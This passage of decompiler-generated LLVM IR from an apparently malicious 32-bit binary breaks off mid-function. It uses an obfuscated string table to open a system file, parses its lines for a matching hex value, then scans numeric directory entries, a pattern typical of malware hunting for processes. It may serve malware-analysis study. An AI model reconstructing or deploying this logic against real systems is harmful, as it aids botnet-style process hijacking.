  %v0_804d6f4 = load i32, i32* @ebx, align 4
  store i32 %v0_804d6f4, i32* %stack_var_-8796, align 4
  %v3_804d6f5 = sext i32 %v0_804d6f4 to i64
  %v4_804d6f5 = call i32 @util_itoa(i64 %v3_804d6f5, i32 16, i32 %v2_804d6ea)
  store i32 %v4_804d6f5, i32* %eax.global-to-local, align 4
  store i32 %v2_804d6ea, i32* %stack_var_-8796, align 4
  %v2_804d703 = call i32 @util_strlen(i8* nonnull %stack_var_-48)
  store i32 %v2_804d703, i32* %eax.global-to-local, align 4
  %v9_804d70b = icmp eq i32 %v2_804d703, 2
  br i1 %v9_804d70b, label %dec_label_pc_804dc6b, label %dec_label_pc_804d714

dec_label_pc_804d714:                             ; preds = %entry, %dec_label_pc_804dc6b
  %stack_var_-47.0 = phi i8 [ 48, %dec_label_pc_804dc6b ], [ %tmp48, %entry ]
  store i32 6, i32* %stack_var_-8796, align 4
  %v2_804d719 = call i32 @table_unlock_val(i8 6)
  store i32 %v2_804d719, i32* %eax.global-to-local, align 4
  store i32 7, i32* %stack_var_-8796, align 4
  %v2_804d725 = call i32 @table_unlock_val(i8 7)
  store i32 %v2_804d725, i32* %eax.global-to-local, align 4
  store i32 8, i32* %stack_var_-8796, align 4
  %v2_804d731 = call i32 @table_unlock_val(i8 8)
  store i32 %v2_804d731, i32* %eax.global-to-local, align 4
  store i32 9, i32* %stack_var_-8796, align 4
  %v2_804d73d = call i32 @table_unlock_val(i8 9)
  store i32 %v2_804d73d, i32* %eax.global-to-local, align 4
  store i32 16, i32* @esi, align 4
  store i32 9, i32* %stack_var_-8796, align 4
  %v3_804d748 = call i32 @table_retrieve_val(i32 9, i32* null)
  store i32 %v3_804d748, i32* @eax, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v3_804d748, i32* %stack_var_-8796, align 4
  %v2_804d754 = call i32 @__libc_open(i32 %v3_804d748, i32 0)
  store i32 %v2_804d754, i32* %eax.global-to-local, align 4
  store i32 %v2_804d754, i32* @ebp, align 4
  %v10_804d75e = icmp eq i32 %v2_804d754, -1
  br i1 %v10_804d75e, label %dec_label_pc_804dbf8, label %dec_label_pc_804d767.outer.preheader

dec_label_pc_804d767.outer.preheader:             ; preds = %dec_label_pc_804d714
  store i32 %v2_804d66a, i32* %stack_var_-8796, align 4
  %v3_804d76f8893 = call i32 @util_fdgets(i32 %v2_804d66a, i32 512, i32 %v2_804d754)
  store i32 %v3_804d76f8893, i32* @eax, align 4
  %v1_804d7778994 = icmp eq i32 %v3_804d76f8893, 0
  br i1 %v1_804d7778994, label %dec_label_pc_804d897.loopexit, label %dec_label_pc_804d77f.lr.ph.lr.ph

dec_label_pc_804d77f.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d767.outer.preheader
  %v2_804d7a7 = add i32 %v15_804d664, 8221
  %v2_804d7d0 = add i32 %v15_804d664, 8219
  br label %dec_label_pc_804d77f.lr.ph

dec_label_pc_804d77f:                             ; preds = %dec_label_pc_804d77f.lr.ph, %dec_label_pc_804d767.backedge
  %v3_804d76f90 = phi i32 [ %v3_804d76f8896, %dec_label_pc_804d77f.lr.ph ], [ %v3_804d76f, %dec_label_pc_804d767.backedge ]
  %v3_804d77f = load i8, i8* %stack_var_-561, align 1
  %v4_804d77f = sext i8 %v3_804d77f to i32
  %v7_804d77f = and i32 %v3_804d76f90, -256
  %v8_804d77f = or i32 %v4_804d77f, %v7_804d77f
  store i32 %v8_804d77f, i32* %eax.global-to-local, align 4
  %v4_804d786 = icmp eq i8 %v3_804d77f, 0
  br i1 %v4_804d786, label %dec_label_pc_804d79e, label %dec_label_pc_804d78a

dec_label_pc_804d78a:                             ; preds = %dec_label_pc_804d77f
  %v10_804d78a = icmp eq i8 %v3_804d77f, 58
  br i1 %v10_804d78a, label %dec_label_pc_804d79e, label %dec_label_pc_804d78e

dec_label_pc_804d78e:                             ; preds = %dec_label_pc_804d78a
  %v1_804d791.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d790

dec_label_pc_804d790:                             ; preds = %dec_label_pc_804d798, %dec_label_pc_804d78e
  %v6_804d791 = phi i32 [ %v8_804d791, %dec_label_pc_804d798 ], [ %v8_804d77f, %dec_label_pc_804d78e ]
  %v0_804d790 = phi i32 [ %v1_804d790, %dec_label_pc_804d798 ], [ 0, %dec_label_pc_804d78e ]
  %v1_804d790 = add i32 %v0_804d790, 1
  %v2_804d791 = add i32 %v1_804d790, %v1_804d791.pre
  %v3_804d791 = inttoptr i32 %v2_804d791 to i8*
  %v4_804d791 = load i8, i8* %v3_804d791, align 1
  %v5_804d791 = zext i8 %v4_804d791 to i32
  %v7_804d791 = and i32 %v6_804d791, -256
  %v8_804d791 = or i32 %v5_804d791, %v7_804d791
  store i32 %v8_804d791, i32* %eax.global-to-local, align 4
  %v4_804d794 = icmp eq i8 %v4_804d791, 0
  br i1 %v4_804d794, label %dec_label_pc_804d767.backedge, label %dec_label_pc_804d798

dec_label_pc_804d798:                             ; preds = %dec_label_pc_804d790
  %v10_804d798 = icmp eq i8 %v4_804d791, 58
  %v1_804d79a = icmp eq i1 %v10_804d798, false
  br i1 %v1_804d79a, label %dec_label_pc_804d790, label %dec_label_pc_804d7a0

dec_label_pc_804d79e:                             ; preds = %dec_label_pc_804d78a, %dec_label_pc_804d77f
  br label %dec_label_pc_804d7a0

dec_label_pc_804d7a0:                             ; preds = %dec_label_pc_804d798, %dec_label_pc_804d79e
  %v1_804d7be = phi i32 [ 0, %dec_label_pc_804d79e ], [ %v1_804d790, %dec_label_pc_804d798 ]
  %v7_804d7a7 = phi i32 [ %v8_804d77f, %dec_label_pc_804d79e ], [ %v8_804d791, %dec_label_pc_804d798 ]
  %v3_804d7a0 = trunc i32 %v7_804d7a7 to i8
  %v4_804d7a0 = icmp eq i8 %v3_804d7a0, 0
  br i1 %v4_804d7a0, label %dec_label_pc_804d767.backedge, label %dec_label_pc_804d7a4

dec_label_pc_804d767.backedge:                    ; preds = %dec_label_pc_804d790, %dec_label_pc_804d7a0, %dec_label_pc_804d7d0
  %v0_804d767.be = phi i32 [ %v7_804d7a7, %dec_label_pc_804d7a0 ], [ 0, %dec_label_pc_804d7d0 ], [ %v8_804d791, %dec_label_pc_804d790 ]
  store i32 %v2_804d66a, i32* %stack_var_-8796, align 4
  %v3_804d76f = call i32 @util_fdgets(i32 %v2_804d66a, i32 512, i32 %v0_804d767.be)
  store i32 %v3_804d76f, i32* @eax, align 4
  %v1_804d777 = icmp eq i32 %v3_804d76f, 0
  br i1 %v1_804d777, label %dec_label_pc_804d897.loopexit, label %dec_label_pc_804d77f

dec_label_pc_804d7a4:                             ; preds = %dec_label_pc_804d7a0
  %v1_804d7a4 = add i32 %v1_804d7be, 2
  store i32 %v1_804d7a4, i32* @ecx, align 4
  %v3_804d7a7 = add i32 %v2_804d7a7, %v1_804d7be
  %v4_804d7a7 = inttoptr i32 %v3_804d7a7 to i8*
  %v5_804d7a7 = load i8, i8* %v4_804d7a7, align 1
  %v6_804d7a7 = zext i8 %v5_804d7a7 to i32
  %v8_804d7a7 = and i32 %v7_804d7a7, -256
  %v9_804d7a7 = or i32 %v6_804d7a7, %v8_804d7a7
  store i32 %v9_804d7a7, i32* %eax.global-to-local, align 4
  %v4_804d7ae = icmp eq i8 %v5_804d7a7, 0
  br i1 %v4_804d7ae, label %dec_label_pc_804db96, label %dec_label_pc_804d7b6

dec_label_pc_804d7b6:                             ; preds = %dec_label_pc_804d7a4
  %v7_804d7b6 = icmp eq i8 %v5_804d7a7, 32
  br i1 %v7_804d7b6, label %dec_label_pc_804db96, label %dec_label_pc_804d7be

dec_label_pc_804d7be:                             ; preds = %dec_label_pc_804d7b6
  %v0_804d7be = load i32, i32* @edi, align 4
  %v2_804d7be = add i32 %v0_804d7be, %v1_804d7be
  store i32 %v2_804d7be, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804dba0, %dec_label_pc_804d7be
  %v0_804d7c6 = phi i32 [ %v1_804d7c6, %dec_label_pc_804dba0 ], [ %v1_804d7a4, %dec_label_pc_804d7be ]
  %v5_804d7c3 = phi i32 [ %v7_804d7c3, %dec_label_pc_804dba0 ], [ %v1_804d7be, %dec_label_pc_804d7be ]
  %v0_804d7c7 = phi i32 [ %v1_804d7c7, %dec_label_pc_804dba0 ], [ %v2_804d7be, %dec_label_pc_804d7be ]
  %v1_804d7c3 = add i32 %v0_804d7c7, 3
  %v2_804d7c3 = inttoptr i32 %v1_804d7c3 to i8*
  %v3_804d7c3 = load i8, i8* %v2_804d7c3, align 1
  %v1_804d7c6 = add i32 %v0_804d7c6, 1
  store i32 %v1_804d7c6, i32* @esi, align 4
  %v1_804d7c7 = add i32 %v0_804d7c7, 1
  store i32 %v1_804d7c7, i32* %eax.global-to-local, align 4
  %v4_804d7c8 = icmp eq i8 %v3_804d7c3, 0
  %v1_804d7ca = icmp eq i1 %v4_804d7c8, false
  br i1 %v1_804d7ca, label %dec_label_pc_804dba0, label %dec_label_pc_804d7d0

dec_label_pc_804d7d0:                             ; preds = %dec_label_pc_804dba0, %dec_label_pc_804d7c3, %dec_label_pc_804db96
  %v1_804d7d0 = phi i32 [ %v1_804d7a4, %dec_label_pc_804db96 ], [ %v1_804d7c6, %dec_label_pc_804d7c3 ], [ %v1_804d7c6, %dec_label_pc_804dba0 ]
  %v3_804d7d0 = add i32 %v1_804d7d0, %v2_804d7d0
  %v4_804d7d0 = inttoptr i32 %v3_804d7d0 to i8*
  store i8 0, i8* %v4_804d7d0, align 1
  %v0_804d7db = load i32, i32* @edi, align 4
  %v1_804d7db = load i32, i32* @ecx, align 4
  %v2_804d7db = add i32 %v1_804d7db, %v0_804d7db
  store i32 %v2_804d7db, i32* @ebx, align 4
  store i32 %v2_804d7db, i32* %stack_var_-8796, align 4
  %v1_804d7df = inttoptr i32 %v2_804d7db to i8*
  %v2_804d7df = call i32 @util_strlen(i8* %v1_804d7df)
  store i32 %v2_804d7df, i32* %eax.global-to-local, align 4
  store i32 %v2_804d6ea, i32* @edx, align 4
  %v0_804d7f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804d7f0, i32* %stack_var_-8796, align 4
  %v3_804d7f1 = inttoptr i32 %v0_804d7f0 to i8*
  %v4_804d7f1 = call i32 @util_stristr(i8* %v3_804d7f1, i32 %v2_804d7df, i32 %v2_804d6ea)
  %v1_804d7f9 = add i32 %v4_804d7f1, 1
  %v8_804d7f9 = icmp eq i32 %v1_804d7f9, 0
  store i32 %v1_804d7f9, i32* %eax.global-to-local, align 4
  br i1 %v8_804d7f9, label %dec_label_pc_804d767.backedge, label %dec_label_pc_804d800

dec_label_pc_804d800:                             ; preds = %dec_label_pc_804d7d0
  %v0_804d800 = load i32, i32* @esi, align 4
  %v1_804d800 = add i32 %v0_804d800, 1
  %v0_804d803 = load i32, i32* @edi, align 4
  %v2_804d803 = add i32 %v0_804d803, %v0_804d800
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d810.outer

dec_label_pc_804d810.outer:                       ; preds = %dec_label_pc_804db88, %dec_label_pc_804d800
  %v0_804db7e30 = phi i32 [ %v1_804db7e, %dec_label_pc_804db88 ], [ 0, %dec_label_pc_804d800 ]
  %v0_804d81325 = phi i32 [ %v1_804d813, %dec_label_pc_804db88 ], [ %v1_804d800, %dec_label_pc_804d800 ]
  %v5_804d81024 = phi i32 [ %v7_804d810, %dec_label_pc_804db88 ], [ %v1_804d7f9, %dec_label_pc_804d800 ]
  %v0_804d81022 = phi i32 [ %v1_804db8e, %dec_label_pc_804db88 ], [ %v2_804d803, %dec_label_pc_804d800 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db88 ], [ 0, %dec_label_pc_804d800 ]
  br label %dec_label_pc_804d810

dec_label_pc_804d810:                             ; preds = %dec_label_pc_804d810.outer, %dec_label_pc_804d832
  %v0_804db7e = phi i32 [ %v0_804db7e30, %dec_label_pc_804d810.outer ], [ %v0_804d833, %dec_label_pc_804d832 ]
  %v0_804dbb0 = phi i32 [ 0, %dec_label_pc_804d810.outer ], [ %storemerge, %dec_label_pc_804d832 ]
  %v0_804d813 = phi i32 [ %v0_804d81325, %dec_label_pc_804d810.outer ], [ %v1_804d813, %dec_label_pc_804d832 ]
  %v5_804d810 = phi i32 [ %v5_804d81024, %dec_label_pc_804d810.outer ], [ %v7_804d810, %dec_label_pc_804d832 ]
  %v0_804d832 = phi i32 [ %v0_804d81022, %dec_label_pc_804d810.outer ], [ %v1_804d832, %dec_label_pc_804d832 ]
  %v1_804d810 = add i32 %v0_804d832, 2
  %v2_804d810 = inttoptr i32 %v1_804d810 to i8*
  %v3_804d810 = load i8, i8* %v2_804d810, align 1
  %v4_804d810 = zext i8 %v3_804d810 to i32
  %v6_804d810 = and i32 %v5_804d810, -256
  %v7_804d810 = or i32 %v4_804d810, %v6_804d810
  store i32 %v7_804d810, i32* %eax.global-to-local, align 4
  %v1_804d813 = add i32 %v0_804d813, 1
  %v4_804d814 = icmp eq i8 %v3_804d810, 0
  br i1 %v4_804d814, label %dec_label_pc_804d838, label %dec_label_pc_804d818

dec_label_pc_804d818:                             ; preds = %dec_label_pc_804d810
  %v7_804d818 = icmp eq i8 %v3_804d810, 32
  br i1 %v7_804d818, label %dec_label_pc_804dbb0, label %dec_label_pc_804d820

dec_label_pc_804d820:                             ; preds = %dec_label_pc_804d818
  %v10_804d820 = icmp eq i8 %v3_804d810, 9
  br i1 %v10_804d820, label %dec_label_pc_804dbb0, label %dec_label_pc_804d828

dec_label_pc_804d828:                             ; preds = %dec_label_pc_804d820
  %v1_804d828 = trunc i32 %v0_804dbb0 to i8
  %v9_804d828 = icmp eq i8 %v1_804d828, 1
  br i1 %v9_804d828, label %dec_label_pc_804db7e, label %dec_label_pc_804d830

dec_label_pc_804d830:                             ; preds = %dec_label_pc_804db7e, %dec_label_pc_804d828
  %v0_804d83331 = phi i32 [ %v1_804db7e, %dec_label_pc_804db7e ], [ %v0_804db7e, %dec_label_pc_804d828 ]
  br label %dec_label_pc_804d832

dec_label_pc_804d832:                             ; preds = %dec_label_pc_804dbb0, %dec_label_pc_804d830
  %v0_804d833 = phi i32 [ %v0_804d83331, %dec_label_pc_804d830 ], [ %v0_804db7e, %dec_label_pc_804dbb0 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804d830 ], [ %v2_804dbb0, %dec_label_pc_804dbb0 ]
  %v1_804d832 = add i32 %v0_804d832, 1
  %v7_804d836 = icmp sgt i32 %v0_804d833, 6
  br i1 %v7_804d836, label %dec_label_pc_804d838, label %dec_label_pc_804d810

dec_label_pc_804d838:                             ; preds = %dec_label_pc_804d832, %dec_label_pc_804d810
  %v5_804d85735 = phi i32 [ %v1_804d832, %dec_label_pc_804d832 ], [ %v0_804d832, %dec_label_pc_804d810 ]
  store i32 %v1_804d813, i32* @ebx, align 4
  %v4_804d83a = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d83a, label %dec_label_pc_804d767.outer.backedge, label %dec_label_pc_804d845

dec_label_pc_804d767.outer.backedge:              ; preds = %dec_label_pc_804d838, %dec_label_pc_804d864
  %v0_804d7676.be = phi i32 [ %v2_804d873, %dec_label_pc_804d864 ], [ %v7_804d810, %dec_label_pc_804d838 ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d864 ], [ 0, %dec_label_pc_804d838 ]
  store i32 %v2_804d66a, i32* %stack_var_-8796, align 4
  %v3_804d76f88 = call i32 @util_fdgets(i32 %v2_804d66a, i32 512, i32 %v0_804d7676.be)
  store i32 %v3_804d76f88, i32* @eax, align 4
  %v1_804d77789 = icmp eq i32 %v3_804d76f88, 0
  br i1 %v1_804d77789, label %dec_label_pc_804d897.loopexit, label %dec_label_pc_804d77f.lr.ph

dec_label_pc_804d77f.lr.ph:                       ; preds = %dec_label_pc_804d77f.lr.ph.lr.ph, %dec_label_pc_804d767.outer.backedge
  %v3_804d76f8896 = phi i32 [ %v3_804d76f8893, %dec_label_pc_804d77f.lr.ph.lr.ph ], [ %v3_804d76f88, %dec_label_pc_804d767.outer.backedge ]
  %stack_var_-8769.0.ph95 = phi i8 [ %tmp52, %dec_label_pc_804d77f.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d767.outer.backedge ]
  br label %dec_label_pc_804d77f

dec_label_pc_804d845:                             ; preds = %dec_label_pc_804d838
  %v3_804d845 = add i32 %v1_804d813, %v2_804d7d0
  %v4_804d845 = inttoptr i32 %v3_804d845 to i8*
  %v5_804d845 = load i8, i8* %v4_804d845, align 1
  %v6_804d845 = zext i8 %v5_804d845 to i32
  %v9_804d845 = or i32 %v6_804d845, %v6_804d810
  store i32 %v9_804d845, i32* %eax.global-to-local, align 4
  %v4_804d84c = icmp eq i8 %v5_804d845, 0
  br i1 %v4_804d84c, label %dec_label_pc_804d864, label %dec_label_pc_804d850

dec_label_pc_804d850:                             ; preds = %dec_label_pc_804d845
  %v7_804d850 = icmp eq i8 %v5_804d845, 32
  br i1 %v7_804d850, label %dec_label_pc_804d864, label %dec_label_pc_804d854

dec_label_pc_804d854:                             ; preds = %dec_label_pc_804d850
  %v2_804d854 = add i32 %v1_804d813, %v0_804d803
  store i32 %v2_804d854, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d857

dec_label_pc_804d857:                             ; preds = %dec_label_pc_804dbb7, %dec_label_pc_804d854
  %v0_804d85a = phi i32 [ %v1_804d85a, %dec_label_pc_804dbb7 ], [ %v1_804d813, %dec_label_pc_804d854 ]
  %v5_804d857 = phi i32 [ %v7_804d857, %dec_label_pc_804dbb7 ], [ %v5_804d85735, %dec_label_pc_804d854 ]
  %v0_804d85b = phi i32 [ %v1_804d857, %dec_label_pc_804dbb7 ], [ %v2_804d854, %dec_label_pc_804d854 ]
  %v1_804d857 = add i32 %v0_804d85b, 1
  %v2_804d857 = inttoptr i32 %v1_804d857 to i8*
  %v3_804d857 = load i8, i8* %v2_804d857, align 1
  %v1_804d85a = add i32 %v0_804d85a, 1
  store i32 %v1_804d857, i32* %eax.global-to-local, align 4
  %v4_804d85c = icmp eq i8 %v3_804d857, 0
  %v1_804d85e = icmp eq i1 %v4_804d85c, false
  br i1 %v1_804d85e, label %dec_label_pc_804dbb7, label %dec_label_pc_804d864

dec_label_pc_804d864:                             ; preds = %dec_label_pc_804dbb7, %dec_label_pc_804d857, %dec_label_pc_804d850, %dec_label_pc_804d845
  %v1_804d864 = phi i32 [ %v1_804d813, %dec_label_pc_804d850 ], [ %v1_804d813, %dec_label_pc_804d845 ], [ %v1_804d85a, %dec_label_pc_804d857 ], [ %v1_804d85a, %dec_label_pc_804dbb7 ]
  %v3_804d864 = add i32 %v1_804d864, %v2_804d7d0
  %v4_804d864 = inttoptr i32 %v3_804d864 to i8*
  store i8 0, i8* %v4_804d864, align 1
  %v0_804d86f = load i32, i32* @edi, align 4
  %v1_804d86f = load i32, i32* @ebx, align 4
  %v2_804d86f = add i32 %v1_804d86f, %v0_804d86f
  store i32 %v2_804d86f, i32* @ebx, align 4
  store i32 %v2_804d86f, i32* %stack_var_-8796, align 4
  %v1_804d873 = inttoptr i32 %v2_804d86f to i8*
  %v2_804d873 = call i32 @util_strlen(i8* %v1_804d873)
  store i32 %v2_804d873, i32* %eax.global-to-local, align 4
  %v1_804d87b = add i32 %v2_804d873, -15
  %v6_804d87b = sub i32 14, %v2_804d873
  %v7_804d87b = and i32 %v6_804d87b, %v2_804d873
  %v8_804d87b = icmp slt i32 %v7_804d87b, 0
  %v9_804d87b = icmp eq i32 %v1_804d87b, 0
  %v10_804d87b = icmp slt i32 %v1_804d87b, 0
  %v3_804d87e = icmp eq i1 %v10_804d87b, %v8_804d87b
  %v4_804d87e = icmp eq i1 %v9_804d87b, false
  %v5_804d87e = and i1 %v4_804d87e, %v3_804d87e
  br i1 %v5_804d87e, label %dec_label_pc_804d767.outer.backedge, label %dec_label_pc_804d884

dec_label_pc_804d884:                             ; preds = %dec_label_pc_804d864
  %v0_804d886 = load i32, i32* @ebx, align 4
  %v2_804d887 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d887, i32* @eax, align 4
  store i32 %v2_804d887, i32* %stack_var_-8796, align 4
  %v2_804d88f = bitcast i32* %stack_var_-32 to i8*
  %v3_804d88f = call i32 @util_strcpy(i8* %v2_804d88f, i32 %v0_804d886)
  store i32 %v3_804d88f, i32* @eax, align 4
  br label %dec_label_pc_804d897

dec_label_pc_804d897.loopexit:                    ; preds = %dec_label_pc_804d767.backedge, %dec_label_pc_804d767.outer.preheader, %dec_label_pc_804d767.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp52, %dec_label_pc_804d767.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d767.outer.backedge ], [ %stack_var_-8769.0.ph95, %dec_label_pc_804d767.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d897

dec_label_pc_804d897:                             ; preds = %dec_label_pc_804d897.loopexit, %dec_label_pc_804d884
  %v1_804d8a9.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d897.loopexit ], [ %v2_804d88f, %dec_label_pc_804d884 ]
  %v2_804d8a1.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d897.loopexit ], [ %v2_804d887, %dec_label_pc_804d884 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d897.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d884 ]
  %v0_804d89a = load i32, i32* @ebp, align 4
  store i32 %v0_804d89a, i32* %stack_var_-8796, align 4
  %v1_804d89b = call i32 @__GI___libc_close(i32 %v0_804d89a)
  %v2_804d8a0 = load i32, i32* %stack_var_-8796, align 4
  store i32 %v2_804d8a0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8a1.pre-phi, i32* %stack_var_-8796, align 4
  %v2_804d8a9 = call i32 @util_strlen(i8* %v1_804d8a9.pre-phi)
  store i32 %v2_804d8a9, i32* %eax.global-to-local, align 4
  %v1_804d8b1 = icmp eq i32 %v2_804d8a9, 0
  br i1 %v1_804d8b1, label %dec_label_pc_804dbc5, label %dec_label_pc_804d8b9

dec_label_pc_804d8b9:                             ; preds = %dec_label_pc_804d897
  store i32 6, i32* %stack_var_-8796, align 4
  %v3_804d8bf = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v3_804d8bf, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v3_804d8bf, i32* %stack_var_-8796, align 4
  %v1_804d8c9 = inttoptr i32 %v3_804d8bf to i8*
  %v2_804d8c9 = call i32 @__GI_opendir(i8* %v1_804d8c9)
  store i32 %v2_804d8c9, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8c9, i32* %stack_var_-8780, align 4
  %v1_804d8d5 = icmp eq i32 %v2_804d8c9, 0
  br i1 %v1_804d8d5, label %dec_label_pc_804d8b9.dec_label_pc_804dc21_crit_edge, label %dec_label_pc_804d8e5.preheader

dec_label_pc_804d8b9.dec_label_pc_804dc21_crit_edge: ; preds = %dec_label_pc_804d8b9
  %.pre47 = sext i8 %stack_var_-8769.2 to i32
  br label %dec_label_pc_804dc21

dec_label_pc_804d8e5.preheader:                   ; preds = %dec_label_pc_804d8b9
  %v1_804dca8 = sext i8 %stack_var_-47.0 to i32
  %v2_804dca8 = inttoptr i32 %v1_804dca8 to i32*
  br label %dec_label_pc_804d8e5

dec_label_pc_804d8e5:                             ; preds = %dec_label_pc_804d9a4, %dec_label_pc_804d915, %dec_label_pc_804d90b, %dec_label_pc_804dca4, %dec_label_pc_804d8e5.preheader
  %v0_804d8e5 = phi i32 [ %v15_804d664, %dec_label_pc_804d8e5.preheader ], [ %v1_804dcad, %dec_label_pc_804dca4 ], [ %v1_804d8f2, %dec_label_pc_804d90b ], [ %v1_804d99a, %dec_label_pc_804d915 ], [ %v1_804da1a, %dec_label_pc_804d9a4 ]
  %v2_804d8e8 = inttoptr i32 %v0_804d8e5 to i32*
  %v3_804d8e8 = load i32, i32* %v2_804d8e8, align 4
  store i32 %v3_804d8e8, i32* @ebx, align 4
  %v2_804d8ec = add i32 %v0_804d8e5, -16
  %v3_804d8ec = inttoptr i32 %v2_804d8ec to i32*
  store i32 %v3_804d8e8, i32* %v3_804d8ec, align 4
  %v0_804d8ed = call i32 @__GI_readdir()
  store i32 %v0_804d8ed, i32* %eax.global-to-local, align 4
  %v0_804d8f2 = load i32, i32* @esp, align 4
  %v1_804d8f2 = add i32 %v0_804d8f2, 16
  %v1_804d8f7 = icmp eq i32 %v0_804d8ed, 0
  br i1 %v1_804d8f7, label %dec_label_pc_804dc0c, label %dec_label_pc_804d8ff

dec_label_pc_804d8ff:                             ; preds = %dec_label_pc_804d8e5
  %v1_804d8ff = add i32 %v0_804d8f2, 20
  %v2_804d8ff = inttoptr i32 %v1_804d8ff to i32*
  %v3_804d8ff = load i32, i32* %v2_804d8ff, align 4
  %v1_804d903 = icmp eq i32 %v3_804d8ff, 0
  %v1_804d905 = icmp eq i1 %v1_804d903, false
  br i1 %v1_804d905, label %dec_label_pc_804dc0c, label %dec_label_pc_804d90b

dec_label_pc_804d90b:                             ; preds = %dec_label_pc_804d8ff
  %v1_804d90b = add i32 %v0_804d8ed, 11
  %v2_804d90b = inttoptr i32 %v1_804d90b to i8*
  %v3_804d90b = load i8, i8* %v2_804d90b, align 1
  %v4_804d90b = zext i8 %v3_804d90b to i32
  %v6_804d90b = and i32 %v0_804d8ed, -256
  %v7_804d90b = or i32 %v4_804d90b, %v6_804d90b
  %v1_804d90e = add i32 %v7_804d90b, -48
  %v8_804d90e = trunc i32 %v1_804d90e to i8
  store i32 %v1_804d90e, i32* %eax.global-to-local, align 4
  %v8_804d913 = icmp ugt i8 %v8_804d90e, 9
  br i1 %v8_804d913, label %dec_label_pc_804d8e5, label %dec_label_pc_804d915

dec_label_pc_804d915:                             ; preds = %dec_label_pc_804d90b
  store i32 %v1_804d90b, i32* @ebp, align 4
  %v2_804d918 = add i32 %v0_804d8f2, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d90e, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d8f2, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d8f2, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d8f2 to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* @eax, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @util_strlen(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @ebp, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* @eax, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94e = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94e, i32* %eax.global-to-local, align 4
  %v0_804d953 = load i32, i32* @esp, align 4
  %v1_804d953 = inttoptr i32 %v0_804d953 to i32*
  %v2_804d953 = load i32, i32* %v1_804d953, align 4
  store i32 %v2_804d953, i32* @edi, align 4
  %v3_804d953 = add i32 %v0_804d953, 4
  %v1_804d954 = inttoptr i32 %v3_804d953 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d954, align 4
  store i32 7, i32* %v1_804d953, align 4
  %v3_804d959 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804d959, i32* %eax.global-to-local, align 4
  %v0_804d95e = load i32, i32* @esp, align 4
  %v1_804d95e = inttoptr i32 %v0_804d95e to i32*
  %v2_804d95e = load i32, i32* %v1_804d95e, align 4
  store i32 %v2_804d95e, i32* @esi, align 4
  store i32 %v3_804d959, i32* @ebx, align 4
